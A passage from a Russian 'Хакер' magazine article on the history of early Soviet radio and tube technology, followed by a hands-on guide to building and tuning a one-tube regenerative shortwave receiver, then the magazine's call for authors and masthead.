                   В те времена в ходу были «мягкие» лампы: дело
                     было в остаточном газе в баллоне лампы, изба‐
                            виться от которого в те времена оказалось зат‐
                            руднительно.  Этот  газ  создавал  ионный  ток,
                      который ухудшал характеристики лампы и спо‐
                            собствовал   быстрому  перегоранию  катодов.
                         Впрочем, иногда в лампу специально вводили
                           ртутные пары, что несколько улучшало ее харак‐
                           теристики.  Передовым  краем  прогресса  счи‐
                        талась  «жесткая»  лампа  с высоким  вакуумом
                      и чисто электронной проводимостью. В итоге уже
                        в начале 1920-х годов «жесткие» лампы вытес‐
                      нили «мягкие».


У начальника станции капитана Аристова идея Бонч‑Бруевича восторгов
не вызвала. Вердикт был следующий: изобретатель может заниматься конс‐
труированием в свободное от службы время, на свои средства, в своем лич‐
ном помещении. Чем, собственно, наш герой и занялся. Правдами и неп‐
равдами, с помощью друзей, знакомых и нескольких единомышленников ему
удалось найти необходимые материалы, приборы и даже ртутно‑поршневой
насос .





               Схема ртутно‑поршневого насоса Шпренгеля

По современным меркам это, конечно, мрак и осознанное самоубийство.
Ведь для работы насоса в него постоянно нужно было подливать металличес‐
кую ртуть. Мало того что это физически тяжело, так и ртутные пары здоровья
не добавляют. Вот и Бонч‑Бруевичу они здоровья не добавили. Он получил
острое отравление ртутью и пару месяцев полежал в больнице, однако лампа
все же была создана.





      Лампа «Бабушка» конструкции Бонч‑Бруевича, серийный вариант

По конструкции это изделие напоминало лампу Раунда, с той лишь разницей,
что анод был выполнен из металлической сетки. Также лампа имела два
катода, и, когда один перегорал (а это случалось достаточно быстро), можно
было использовать второй. Получить «жесткую» без всяких оговорок лампу
тогда не вышло, но это было уже достойное приближение к желаемому. Учи‐
тывая, что разработки велись подручными средствами, изобретатель добил‐
ся великолепного результата. На основе этой лампы Бонч‑Бруевич создал
приемник собственной конструкции, который, судя по последующим событи‐
ям, сильно превзошел штатный приемник Маркони.





   Приемник конструкции Бонч‑Бруевича на его же радиолампе «Бабушка»

Любопытно, что про этот приемник написано много, однако схемы мне найти
так и не удалось. Судя по названию «катодный прерыватель» и виду лицевой
панели, вероятно, это была вариация на тему схемы Раунда.





                        Автодинный приемник Раунда

Но в принципе, с тем же успехом это мог быть и регенератор Армстронга.





              Схема регенеративного приемника Армстронга




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИGEEK
       РЕГЕНЕРАТОР
           ВОЗРОЖДАЕМ ТЕХНОЛОГИИ
                  XX ВЕКА 100 ЛЕТ СПУСТЯ




Такие приемники отличались высокой чувствительностью, а кроме того, поз‐
воляли принимать как затухающие колебания (псевдоAM), так и набирающие
в то время популярность незатухающие колебания — собственно телеграф.
Отпадала необходимость в дорогостоящем  механическом  прерывателе,
и появлялась возможность легко перестраивать частоту в широких пре‐
делах — в общем, сплошные плюсы. Командование оценило результаты про‐
веденной работы. Капитана Аристова на посту начальника станции заменили
штабс‑капитаном В. М. Лещинским , по ходатайству которого Бонч‑Бруевич
отправился стажироваться во Францию на производство радиоламп.
   Когда он вернулся из Франции, в России организовали производство
радиоламп конструкции Бонч‑Бруевича. Как показала война, иметь свое про‐
изводство крайне полезно, поскольку Антанта была нам условными друзьями,
а немецкий «Телефункен» отвалился по очевидной причине. В итоге было
произведено около 3000 ламп для нужд армии. Себестоимость их составля‐
ла 32 рубля против 200 рублей за продукцию «Маркони» и РОБТиТ.
  Все шло хорошо, но тут случилась Февральская революция, и Временное
правительство  прекратило  финансирование  производства.  Сотрудников
начали активно переманивать «Siemens & Halske AG», «Эриксонъ», РОБТиТ
(«Маркони»). После Октябрьской революции отношения с Антантой испорти‐
лись окончательно, и иностранные компании свернули собственное про‐
изводство. То, что осталось, было национализировано.
   Так или иначе, Бонч‑Бруевич и Лещинский сумели сохранить лабораторию
при Тверской радиостанции. Сама радиостанция после революции перешла
в подчинение Народного комиссариата почт и телеграфов (НКПиТ). Молодая
советская власть очень активно взялась за радио, и у этого интереса была
совершенно объективная причина. Ленин увидел в радио огромный потен‐
циал в качестве рупора пропаганды. Большая часть царских ученых и инже‐
неров в области  радиотехники с минимальными проблемами перешла
под крыло советской власти, в их числе Бонч‑Бруевич (ставший впоследствии
членом‑корреспондентом АН СССР), Н. Д. Папалекси (академик АН СССР),
Л. И. Мандельштам (еще один академик АН СССР), В. П. Вологдин (член‑кор‐
респондент АН СССР) и многие другие. Не сложилось с советской властью
разве что у Айзенштейна. У него были весомые поводы не любить новое пра‐
вительство, у власти к нему тоже, судя по всему, были вопросы. Поэтому
в 1922 году Айзенштейн эмигрировал и продолжил работать в компании
«Маркони».
   Итак, в 1918 году при непосредственной поддержке правительства и лич‐
но Ленина была организована Нижегородская радиолаборатория , созданная
на базе вышеупомянутой Тверской лаборатории. Которая, соответственно,
переехала в Нижний Новгород. Задачи перед сотрудниками ставили понят‐
ные: нужно было в первую очередь организовать производство отечествен‐
ных усилительных ламп для нужд армии. Освоить радиотелефонию, которая
примерно в то время стала переходить от сугубо экспериментальных уста‐
новок в реально используемый метод связи.


АМПЛИТУДНАЯ МОДУЛЯЦИЯ

Наверное, из 2025 года это не так очевидно, но до начала 1920-х радио
использовалось сугубо в качестве телеграфа. О передаче речи и музыки
даже разговоров не шло, за исключением отдельных экспериментов. И тут
вырисовывается сразу две проблемы: как вещать и на что принимать. Первые
опыты в Нижегородской лаборатории ставились с дуговыми генераторами,
которые могли давать незатухающие колебания. Модуляция осуществлялась
включением угольного микрофона в цепь заземления выходного контура.





           Схема экспериментального дугового АМ‑передатчика

Однако достаточно быстро выяснилось, что дуговые генераторы не годятся
для АМ‑вещания. Высокочастотные динамо‑машины тоже себя не оправдали.
Стало очевидно, что необходимы мощные генераторные лампы. К тому вре‐
мени уже было налажено мелкосерийное производство маломощных ламп
ПР1 (пустотное реле) и некоторых других типов подобных устройств.





           Серийная лампа ПР1 Нижегородской радиолаборатории

И вот тут возникла сложность. С ростом мощности рос нагрев анода. В прин‐
ципе, эта проблема решалась применением редкоземельных металлов типа
тантала, однако и с ними не все так просто. Такие материалы обходились
дорого, и нам их отказывались поставлять. А главное, даже использование
тугоплавких анодов не решало проблему, так как при сильном нагреве анода
начиналась вторичная эмиссия электронов, что портило характеристики лам‐
пы.
   Проблема была решена Бонч‑Бруевичем просто и элегантно: водяным
охлаждением анода. Это поистине прорывное решение уже к 1920 году поз‐
волило создавать лампы мощностью в сотни, а впоследствии и в тысячи ватт
и дало возможность СССР стать лидером в производстве мощных генератор‐
ных ламп (но не по количеству в штуках). В том же 1920 году состоялась пер‐
вая  в  Советской  России  экспериментальная  трансляция  музыкальной
передачи. Передачу успешно приняли в Москве. В дальнейшем опыты
по передаче речи велись один‑два раза в неделю с 14 до 15 ч и с 20 до 21 ч
на длинах волн 2500 и 5000 м.





                        Генераторные лампы, 1920 год





                Макет 40-ваттного АМ‑передатчика, 1920 год





                     Схема АМ‑передатчика, 1920 год

Как и большинство схем тех лет, передатчик прост до предела: задающий
генератор  с  индуктивной  обратной  связью  нагружен  непосредственно
на антенну. Модуляция анодная, правда включение несколько непривычное.
Питает все это динамо‑машина. Аудиосигнал с угольного микрофона через
трансформатор подается непосредственно на модуляторную лампу. Также
хорошо  видно, что накал и напряжение смещения модулятора  берутся
от отдельных батарей, что характерно для ранних схем. То, что на макете
передатчика ламп явно больше, чем на схеме, объясняется тем, что лампы
часто ставили в параллель для увеличения мощности.
   Результаты получились достаточно впечатляющими — власти оказывали
экспериментаторам всяческую поддержку, в том числе в «ручном режиме»:
широко известно письмо Ленина Бонч‑Бруевичу.





          Письмо Ленина Бонч‑Бруевичу от 5 февраля 1920 года


      Михаил  Александрович! Тов. Николаев передал мне Ваше письмо
      и рассказал суть дела. Я навел справки у Дзержинского и тотчас же«
       отправил обе просимые Вами телеграммы. Пользуюсь случаем, чтобы
      выразить Вам глубокую благодарность и сочувствие по поводу боль‐
     шой  работы  радиоизобретений,  которую  Вы   делаете.  Газета
      без бумаги и «без расстояний», которую Вы создаете, будет великим
      делом. Всяческое и всемерное содействие обещаю Вам оказывать
      этой и подобным работам. С  лучшими пожеланиями  В.  Ульянов
       (Ленин).                »
В 1923 году был заключен договор с французской фирмой «Compagnie
Générale d’Électricité», в соответствии с которым советской стороне передали
техническую документацию, материалы и оборудование для производства
французских радиоламп. И уже в том же 1923 году на предприятии начали
выпуск генераторных ламп по французским образцам, а также усилительных
ламп Р-5 и «Микро». В общем, когда подворачивалась возможность, что‑то
покупали, что‑то копировали. Сотрудничество с американской RCA вылилось
в создание серии советских октальных ламп, но это было уже в 1930-х.
   Советская радиотехника постепенно развивалась, радиостанции стро‐
ились. Где‑то с 1922 года уже шло регулярное вещание. Правда, слушателей
насчитывалось маловато. Проблема казалась очевидной, а вот ресурсов
на ее решение не хватало. Решено было перенять американский опыт и мак‐
симально    задействовать    в    радиофикации     энтузиастов.    Так,
28 июля 1924 года выходит постановление, позволяющее частным лицам
и организациям иметь радиоприемники. Их надлежало регистрировать и пла‐
тить абонентскую плату, а рабочие частоты строго регламентировались. Зато
все было законно. А параллельно начали издавать журналы и брошюры, объ‐
яснявшие теоретические основы радио и содержащие схемы практических
конструкций с пояснениями, как это все собирать из доступных материалов.
Наиболее известными в те времена были журналы «Радио», «Радиолюбитель»
и «Друг радио» .
  А на чем это можно было послушать? Самый распространенный и простой
о ту пору приемник — детекторный , или 0V0, что означает отсутствие кас‐
кадов усиления перед детектором и после него. Детектор обыкновенно
использовался кристаллический, применять ламповый диод в детекторном
приемнике в 1920-х годах могло прийти в голову только очень упоротому
человеку.





  Описание популярного в 1920-е годы советского детекторного приемни‐
  ка

Кристаллические детекторы обыкновенно  изготавливали самостоятельно,
благо вариантов там имелась масса. С современной точки зрения кристалли‐
ческий детектор представляет собой точечный диод, образованный метал‐
лической  иглой  и  кристаллом  полупроводника.  Современные  фанаты
«лоу‑теха» чаще всего используют пару графит / железная окалина, наиболее
доступную в домашних условиях.





          Современная «лоу‑тех»-версия детекторного приемника

Детекторные приемники получили широкое распространение еще в 1910-х
годах, так как позволяли принимать телеграфный сигнал искровых передат‐
чиков. Благо по счастливому стечению обстоятельств такой сигнал амплитуд‐
но модулирован.
   Следом с точки зрения популярности уверенно шел регенеративный при‐
емник Армстронга и ультрааудион Фореста. Последний в качестве регене‐
ратора был менее популярен из‑за катушки, висящей в воздухе, и сложностей
с регулировкой обратной связи. Впрочем, в качестве сверхрегенератора он
вытеснил схему Армстронга, но это было уже гораздо позднее.
   Итак, регенератор  уверенно опережал детекторный приемник как по
характеристикам, так и по цене. Полный комплект материалов с радиолампой
легко мог обойтись в десяток‑другой рублей. И это по минимуму, а советский
червонец 1924 года чеканили, к слову сказать, из золота. Впрочем, о регене‐
раторе мы скоро подробно поговорим.
   Приемники прямого усиления, рекламой блоков которых изобиловали
журналы «Радио» ранних лет, могли себе позволить разве что организации
или очень обеспеченные энтузиасты. Но и они обычно содержали регене‐
ративный каскад. Что же касается супергетеродинов , то их в 1920-е годы
в Советской России щупали разве что лишь в радиолабораториях и универ‐
ситетах.


КУРЬЕЗ КОРОТКИХ ВОЛН

История развивается порой причудливым образом. Так получилось и с радио.
Зародившись на метровых волнах (лучи  Герца), оно эволюционировало
к средним и длинным волнам. После чего пошло обратным путем: КВ, мет‐
ровые волны, дециметровые, сантиметровые... К началу 1920-х годов корот‐
кие волны считались «мусорными» и практически никак не регулировались.
Но все изменилось благодаря радиолюбителям‑энтузиастам, в том числе
нашему соотечественнику Федору Лобову (R1FL).
  Жил в Нижнем Новгороде Федор Алексеевич Лобов, работал бухгалтером,
и было у него хобби — радио. По этому поводу он даже пытался устроиться
в Нижегородскую радиолабораторию, но с первого раза его туда не взяли.
Тогда Лобов решил продолжать эксперименты своими силами, благо некото‐
рую помощь сотрудники НРЛ ему таки оказали. И к началу 1925 года ему уда‐
лось построить свой КВ‑радиопередатчик.
   КВ‑радиопередатчики тогда не были законодательно регламентированы,
впрочем, он это делал не втихаря, а с разрешения губернского исполкома
и одобрения Бонч‑Бруевича. Придумал себе позывной R1FL (Россия первый
Федор Лобов) и ночью 15 января 1925 года впервые вышел в эфир: «Всем,
всем! Здесь Р1ФЛ. Сообщите о слышимости, Россия, Нижний Новгород,
Новая, 40». Приемник он к тому времени еще не собрал. На следующий день
пришла телеграмма: «Вы громки на 96 метрах, буду слушать в 18:00 по грин‐
вичскому времени». Последующие сеансы также нашли живой отклик. Шергат
(Ирак, 2300 км), Париж (Франция, 2800 км), и это все на мощности 20 Вт
с антенной‑веревкой. Так был сделан еще один шаг в популяризации корот‐
ких волн. В результате Лобова приняли на работу в НРЛ. Он вписал себя
в историю как первый советский радиолюбитель‑коротковолновик, получил
всесоюзную известность. А некоторое время спустя к нему пришли с обыском
и конфисковали передатчик. Все обошлось, но передатчик Лобову так и не
вернули.





           Федор Лобов на фоне своего передатчика, 1925 год


РЕГЕНЕРАТОР

Общие рассуждения
В одном из номеров журнала «Радио» за 1925 год есть интересная статис‐
тика: на чем американцы слушают радиопередачи из Англии. Уверенный топ
с долей 50% там занимают регенераторы. Заметь, это в США, где с матери‐
альным обеспечением дела обстояли заметно лучше нашего. Дальше в той
статье, конечно, идет отповедь, как это плохо‑плохо и сильно засоряет эфир.
Очень в нашей литературе не любили регенераторы. А все дело в том, что
регенератор склонен излучать на частоте, которую принимает, причем в лам‐
повом исполнении это даже может быть заметная мощность.
   Усугублялось это еще и тем, что с регенератором использовали большие
внешние антенны, часто полноразмерные, которые хороши не только на при‐
ем, но и на передачу. Так в чем же секрет популярности регенераторов? Все
дело в том, что по соотношению цена/эффективность они уделывают все
остальные типы приемников и требуют для постройки лишь одну лампу. Надо
ли говорить, что, несмотря на всю официальную нелюбовь, практически
в каждом раннем выпуске «Радио» была схема регенератора? Для отечес‐
твенного радиолюбителя той поры, считай, других вариантов не было.


             INFO

                   В 2025 году нет ни одной причины собирать
                         регенератор в качестве приемника, его схемотех‐
                          ническая  простота  начисто  подавляется  кап‐
                       ризностью, нестабильностью и сложностью нас‐
                            тройки. А  попытки  исправить  эти  недостатки
                           уничтожают и простоту, решая проблемы лишь
                            частично.  Однако  чисто ради фана  покрутить
                         регенератор  вечер‑другой  вполне  можно.  Так
                             сказать, проникнуться духом эпохи.
                              Поэтому далее при выборе схемотехнических
                      и конструкционных решений предпочтение прак‐
                           тически всегда будет отдаваться наиболее прос‐
                       тым, где это только возможно. Что же касается
                          диапазона, то в Москве в многоквартирном доме
                       для такого приемника хороший вариант — вер‐
                       хние КВ‑диапазоны, в других ловить нечего.


Итак, классическая схема регенератора Армстронга выглядит следующим
образом.





                        Базовая схема регенератора




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИGEEK

       РЕГЕНЕРАТОР
           ВОЗРОЖДАЕМ ТЕХНОЛОГИИ
                  XX ВЕКА 100 ЛЕТ СПУСТЯ




Мы уже касались принципов работы этой схемы, когда обсуждали сверхре‐
генератор и супергетеродин . Но если совсем кратко, то положительная
обратная связь компенсирует потери в контуре, повышая его добротность,
а следовательно, чувствительность и селективность приемника. На длинных
и средних волнах слишком высокая добротность может сузить полосу пропус‐
кания и сказаться на звучании. На верхних КВ‑диапазонах такая проблема
не возникает, там в любом случае полоса будет шире, чем следует.
   После определенного предела положительная обратная связь полностью
компенсирует потери контура, что приводит к генерации. Приемник может
работать в двух режимах: сеточный детектор и автодин/синхродин. Первый
случай — до порога генерации, а сигнал с контура детектируется на участке
«катод — сетка» и выделяется на гридлике (RC-цепочка в сетке). Второй слу‐
чай — на пороге генерации или чуть за ним. Здесь детектирование происхо‐
дит как прямое  преобразование  входного  сигнала в  звуковую  частоту.
Это гетеродин с нулевой промежуточной частотой. В таком режиме также
можно принимать телеграф и SSB. По моим наблюдениям, в режиме син‐
хронного детектирования чувствительность максимальна, что вполне сог‐
ласуется с теорией. На верхних КВ‑диапазонах приемник можно загнать
в режим сверхрегенерации, но лучше так не делать.


Практическая реализация
Для регенератора критически важна настройка регенерации. В идеале она
должна быть максимально плавной, не иметь гистерезиса и не влиять на час‐
тоту настройки. Однако в реальном мире все выходит не так, как хочется, гис‐
терезис есть всегда и настройка плывет. Но плавного подхода можно добить‐
ся.
  В классической схеме сверху регулировка регенерации осуществлялась
сдвиганием‑раздвиганием катушек, и это, прямо скажем, не очень удобно.
На ДВ и СВ катушки большие. Там есть относительно простые варианты, а на
КВ это уже затруднительно. Кроме того, на КВ еще вылезает проблема остро‐
ты  настройки: при использовании  конденсатора для  настройки попасть
в станцию — это отдельное искусство, если нет верньера, а с ним замора‐
чиваться не хочется. Поэтому мы пойдем простым путем и, вдохновившись
идеей из интернета , соберем вариометр из клеевого карандаша. Поступим
еще проще — заменим клеящую массу отрезком алюминиевой трубки (луч‐
ше, конечно, медной и серебряной, но и алюминий сойдет) диаметром 10 мм
и длиной примерно столько же. Пара слоев изоленты — и конструкция готова.





                           Сердечник катушки

Катушку же намотаем на корпус карандаша, около колпачка. Так как сейчас
не начало XX века, то выбор ламп у нас богатый. Я остановился на стержне‐
вой  1Ж17Б.  Она  маленькая,  ток  накала  мизерный,  характеристики
для батарейной лампы тоже очень хорошие, особенно частотные. Их же
для УКВ и космического применения разрабатывали. Кроме того, лет пять
назад такие лампы продавали практически на вес, видать, разгружали нас‐
ледие армейских складов.
   Важный элемент — пентод, который позволит применить регулировку
регенерации потенциалом ускоряющей сетки. В 1920-е так еще не делали (ну
или делали очень редко: тетроды и пентоды массово вошли в практику уже
в 1930-х). Авторы различных публикаций сходятся, что это лучший способ.
В сверхрегенераторе такой метод оказался неудобным, а тут в самый раз.
Влияние на частоту настройки минимально, гистерезиса тоже практически
нет. Идеальное решение.
   Теперь катушка. Ее мотаем канатиком из восьми жил эмалированного
провода ПЭТВ-2 0.125. Канатик уменьшит скин‑эффект. Можно взять и одно‐
жильный провод диаметром около 1 мм. Наматываем 12 витков с шагом при‐
мерно 0,8 мм. Диаметр корпуса карандаша в моем случае около 22 мм.
Начало и конец катушки фиксируем ниткой и проклеиваем все клеем № 88,
«Моментом» или чем‑то подобным. Главное, чтобы  витки были хорошо
зафиксированы.
   Мотаем сверху слой картона, крепим тем же клеем. Сверху наматываем
анодную катушку в четыре витка, но можно намотать и побольше, вплоть
до двенадцати витков. Диаметр провода тут особо не важен: можно тем же
канатиком, можно потоньше. Шаг тоже некритичен, можно виток к витку. Сле‐
дом мотаем катушку связи с антенной — один виток того же провода. Лучше
мотать поближе к «холодному» (тот, который будет заземлен) концу контурной
катушки, чтобы минимизировать емкостное влияние. Фиксируем все ниткой
и еще раз проклеиваем. Готово.
  Для тех, кому любопытно, вот рекомендации по намотке высокодобротных
катушек .
   Теперь переходим к схеме, она очень проста.





                      Практическая схема регенератора

Собирать удобнее всего в манхэттенской технике, о которой говорилось
в предыдущих статьях. Мне показалось очень удобным вырезать пятачки
дыроколом по металлу.





                          Дырокол по металлу

Получаем вот такую занятную штуковину.





                       Внешний вид приемника

Сердечник катушки стоит на положенном ему месте.





                         Вариометр в разборе

Внимательный читатель может заметить на плате лишний конденсатор в кон‐
туре. Он был добавлен для перестройки на 31-метровый диапазон в вечернее
время. Если увеличить емкость С7 до 68 пФ, то можно опуститься до диапа‐
зона 41 м. Но для нижних диапазонов лучше увеличить индуктивность кон‐
турной катушки, так работа приемника будет устойчивее. Катушку связи тоже
стоит увеличить.


Специфика коротких волн
Специфика коротких волн в том числе включает в себя сильную зависимость
прохождения от времени суток. Есть так называемые дневные (25–12 м /
11,6–26,1 МГц) и ночные диапазоны (31 м и длиннее / 10 МГц и ниже). Если
ты хочешь что‑то наверняка услышать, рекомендую проводить эксперименты
днем, чуть позже полудня, причем слушать 19- и 16-метровый диапазон.
В хороший день китайцы звучат громче местных ФМ‑станций. А вот и список
диапазонов:
 • 11 м, 25,60–26,10 МГц (11,72–11,49 м);
 • 13 м, 21,45–21,85 МГц (13,99–13,73 м);
 • 15 м, 18,90–19,02 МГц (15,87–15,77 м);
 • 16 м, 17,55–18,05 МГц (17,16–16,76 м);
 • 19 м, 15,10–15,60 МГц (19,87–18,87 м);
 • 22 м, 13,50–13,87 МГц (22,22–21,63 м);
 • 25 м, 11,60–12,10 МГц (25,86–24,79 м);
 • 31 м, 9,40–9,99 МГц (31,91–30,03 м);
 • 41 м, 7,20–7,50 МГц (41,67–39,47 м);
 • 49 м, 5,85–6,35 МГц (52,36–47,66 м);
 • 60 м, 4,75–5,06 МГц (63,16–59,29 м);
 • 75 м, 3,90–4,00 МГц (76,92–75 м);
 • 90 м, 3,20–3,40 МГц (93,75–88,24 м);
 • 120 м (средние волны), 2,30–2,495 МГц (130,43–120,24 м).

25 и 22 м хорошо слышно вечером. Около полуночи имеет смысл слушать 41-
метровый диапазон.



Питание в лучших традициях 1920-х годов — батарейное. Накал — NiMH-
аккумулятор, анод — сборка из пяти «Крон». Вместо аккумулятора можно
взять батарейку, с ней конструкция будет работать даже лучше. Но из даташи‐
та известно, что такой подход значительно ускорит деградацию катода. Впро‐
чем, это все равно будут десятки и сотни часов наработки. Это все еще та
батарея, что питала сверхрегенератор. Она до сих пор дает 47 В. Думаю, она
потечет или высохнет раньше, чем сядет. Токи тут мизерные, меньше 1 мА.
Практика показала, что больше не всегда лучше, наибольшая громкость при‐
ема наблюдается при питании от 28 В, а работоспособность сохраняется
вплоть до 18 В.
   Рекомендации по сборке обычные. Провода покороче, монтаж пожестче.
Как видно из фотографий, последним я явно пренебрег. Здесь не УКВ, и это
не так критично, хотя влияет на стабильность работы приемника. В качестве
антенны использован двухметровый кусок провода, протянутый к окну. Также
использовано заземление. Я использовал сетевую землю, можно сделать
заземление на батарею. В принципе, ничто не мешает использовать и просто
пару  метров  провода  как  противовес.  Наушники  я  взял высокоомные
(3200 Ом) ТА-56М.


Настройка
После включения проверяем напряжения. На нити накала должно быть 1,2 В,
а сама она в темноте должна светиться оранжевым светом. На ускоряющей
сетке напряжение должно регулироваться от 0 где‑то до 20 В. Напряжение
на аноде должно быть чуть ниже напряжения питания. При вращении ручки
переменного резистора в районе порога генерации должен  появляться
характерный шум.
   Если к выводу антенны подключить осциллограф, на экране должна отоб‐
ражаться генерация, нарастающая с увеличением потенциала ускоряющей
сетки. Если все напряжения в норме, а генерации нет, нужно поменять мес‐
тами выводы контурной катушки или катушки связи. В целом запускается эта
штука довольно легко без особых плясок с бубном, достаточно взять исправ‐
ную лампу и все правильно собрать.
   Осталось попасть в диапазон. Я рекомендую  вооружиться RTL SDR
или осциллографом с функцией анализа спектра. Осциллограф подключаем
прямо к антенному гнезду вместе с антенной, работе приемника он особо
не мешает.





   Генерация в приемнике на экране спектроанализатора (пик под меткой)

Дальше все тривиально. Смотрим на SDR, где станция, добиваемся генера‐
ции в приемнике, смотрим в спектроанализатор и подстроечным конденса‐
тором подгоняем частоту в район станции. На экране SDR это тоже хорошо
видно.





  Экран SDR. Красным обозначена генерация, синим — желаемая станция

Дальше, подстраивая катушку и уровень регенерации, добиваемся наилуч‐
шего качества приема. Уровень регенерации заметно влияет на частоту,
и наоборот, что придает настройке особый шарм. Впрочем, можно пойти
и хардкорным путем и настраиваться без приборов, ориентируясь на звук
в наушниках. Это вполне реально. Порог генерации слышно, и в таком
режиме проскок станции можно определить по весьма характерному свисту.
С отключенным C7 приемник перекрывает диапазон от 12 до 22 МГц, с вклю‐
ченным — нижний край спускается до 10 МГц. Если увеличить емкость
C7 до 47 или 68 пФ, можно спуститься до 8 и 7 МГц соответственно.


А ЧТО ТАМ ВСЕ-ТАКИ СЛЫШНО?

К моему удивлению, что‑то и правда слышно, причем иногда даже хорошо
слышно. Ну, китайцев ты точно сможешь послушать в хороший день с ком‐
фортом, а это, на секундочку, 7000 км. Я хорошо слышал радио Ватикана
(2300 км) и еще несколько станций, которые не идентифицировал. На 40 м
можно даже услышать любителей, передающих морзянку. Но стабильности
для любительской связи не хватает. И все это ловится на кусок провода, так
что чувствительность у этой штуки достаточная.
  В целом то, что комфортно и чисто звучит на SDR, неплохо слушать и тут.
Кроме того, если станция достаточно мощная, то и настройка упрощается,
срабатывает автозахват частоты. Вот со слабыми станциями, конечно, при‐
дется ручки покрутить. В общем, как это ни удивительно, технологии столет‐
ней давности до сих пор хорошо работают, и это впечатляет! Если хочется
попаять и занять себя на пару‑тройку дней, регенератор тебе наверняка пон‐
равится.
   Главное — учитывать время суток и помнить, что иногда прохождение сиг‐
нала бывает плохим. Отчаиваться тут не надо. В остальном всё как мы любим:
теплый ламповый звук в наушниках ТА-56М. Однако если хочется слушать
далекие станции, то надо использовать супергетеродин или SDR.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» всегда нужны новые авторы, и ты можешь стать
одним из них! Если тебе интересно то, о чем мы пишем,
и есть желание исследовать эти темы вместе, не упусти воз‐
можность вступить в ряды наших авторов и получать за это
все, что им причитается.


 • Авторы получают денежное вознаграждение. Размер зависит от слож‐
   ности и уникальности темы и объема проделанной работы (но не от объ‐
  ема текста).
 • Наши авторы читают «Хакер» бесплатно : каждая опубликованная статья
   приносит месяц подписки и значительно увеличивает личную скидку. Уже
   после третьего раза подписка станет бесплатной навсегда.

Кроме того, наличие публикаций — это отличный способ показать
работодателю и коллегам, что ты в теме . Если ты студент или научный
сотрудник, публикация в журнале пригодится особенно . А еще мы пла‐
нируем запуск англоязычной версии, так что у тебя будет шанс быть
узнанным и за рубежом .
  И конечно, мы всегда указываем в статьях имя или псевдоним
автора. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что‑то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


Я ТЕХНАРЬ, А НЕ ЖУРНАЛИСТ. ПОЛУЧИТСЯ ЛИ У МЕНЯ НАПИСАТЬ
СТАТЬЮ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом‐
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ‐
ходимость. И конечно, перед публикацией мы согласуем с автором все прав‐
ки и вносим новые, если нужно.


КАК ПРИДУМАТЬ ТЕМУ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
   Первым делом задай себе несколько простых вопросов:
 • «Разбираюсь ли я в чем‑то, что может заинтересовать других?» Час‐
   тый случай: люди делают что‑то потрясающее, но считают свое занятие
   вполне  обыденным. Если  твои мама и  бабушка не  хотят  слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес‐
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Были ли у меня в последнее время интересные проекты?» Если ты
   ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что‑то необычное или даже  просто  настроил себе
   какую‑то удобную штуковину, обязательно расскажи нам! Мы вместе при‐
   думаем, как лучше подать твои наработки.
 • «Знаю ли я какую‑то историю, которая кажется мне крутой?» Поп‐
   робуй  вспомнить: если ты  буквально  недавно  рассказывал  кому‑то
  о чем‑то очень важном или захватывающем (и связанном с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Не подмечал ли я, что в Хакере упустили что‑то важное?» Если мы
  о чем‑то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под‐
   кинуть нам идею все равно можно.


Уговорили, каков план действий?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому‑то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда‐
   ет тебе правила оформления и отвечает на твои вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие‑то проб‐
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор  читает статью,  принимает ее или  возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если готов публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции .
   №5 (314)

          Андрей Письменный        Валентин Холмогоров         Илья Русанен
              Главный редактор           Ведущий редактор                  Разработка
             pismenny@glc.ru            valentin@holmogorov.ru            rusanen@glc.ru
                          Евгения Шарипова             yambuto
                           Литературный редактор           Бильд‑редактор
                                                    yambuto@gmail.com


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                               Марк Бруцкий‑Стемпковский,
                                         Алексей Глазков, Nik Zerof,
                                   Юрий Язев


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                          Вопросы о подписке:          ​Вопросы о материалах:
                                lapina@glc.ru                  support@glc.ru​





Учредитель: ИП Яковлева Анна Вадимовна ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Московская область,
Пушкино, мкр Софрино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегистрировано Федеральной службой по надзору в сфере связи,
информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация к размышлению. Лица,
